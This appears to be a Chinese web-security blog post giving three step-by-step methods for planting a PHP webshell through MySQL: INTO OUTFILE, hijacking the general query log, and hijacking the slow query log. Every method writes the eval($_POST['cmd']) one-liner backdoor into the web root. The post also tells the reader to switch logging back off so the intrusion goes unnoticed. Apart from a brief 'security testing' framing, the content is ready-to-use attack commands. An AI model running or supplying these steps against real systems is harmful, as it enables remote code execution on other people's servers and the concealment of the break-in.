---
title: SQL 注入写 shell
date: 2026-08-14 12:00:00
categories:
  - Web安全
tags:
  - SQL注入
  - getshell
description: MySQL 写入 WebShell 的三种常用方法
---

通过 MySQL 写入 WebShell 是一种常见的安全测试技术，通常需要特定权限和配置。

### 方法 1：使用 OUTFILE 写入 Shell
**原理**：把 SELECT 查询结果写入文件。

#### 条件：
+ 数据库用户具有 FILE 权限。
+ 知道目标网站的绝对路径，并且该路径具有写入权限。
+ secure_file_priv 参数未限制写入路径。

执行以下 SQL 语句，将一句话木马写入文件：

```plain
SELECT '<?php @eval($_POST["cmd"]); ?>' INTO OUTFILE 'C:/phpStudy/WWW/shell.php';
```

验证文件是否成功写入，并通过 Web 访问测试。

#### 注意：
OUTFILE 会在每行末尾添加换行符，适合写文本文件。

如果路径受限，可尝试修改 MySQL 配置文件中的 secure_file_priv 参数。

### 方法 2：利用全局日志写入 Shell
**原理**：开启 MySQL 通用日志（general log），把日志文件路径改成网站目录下的 .php，然后执行一句带木马的 SQL，日志里就有木马了。

#### 步骤：
检查全局日志是否开启：

```plain
SHOW VARIABLES LIKE '%general_log%';
```

开启全局日志并设置日志路径为目标目录：

```plain
SET GLOBAL general_log = 'ON';
SET GLOBAL general_log_file = 'C:/phpStudy/WWW/shell.php';
```

执行一条包含 WebShell 的查询语句：

```plain
SELECT '<?php @eval($_POST["cmd"]); ?>';
```

恢复原始日志配置以避免被发现：

```plain
SET GLOBAL general_log = 'OFF';
```

### 方法 3：通过慢查询日志写入 Shell
#### 步骤：
检查慢查询日志是否开启：

```plain
SHOW VARIABLES LIKE '%slow_query_log%';
```

开启慢查询日志并设置日志路径：

```plain
SET GLOBAL slow_query_log = 'ON';
SET GLOBAL slow_query_log_file = 'C:/phpStudy/WWW/shell.php';
```

执行一条耗时查询并注入 WebShell：

```plain
SELECT '<?php @eval($_POST["cmd"]); ?>' OR SLEEP(11);
```

验证文件是否成功生成，并关闭慢查询日志。
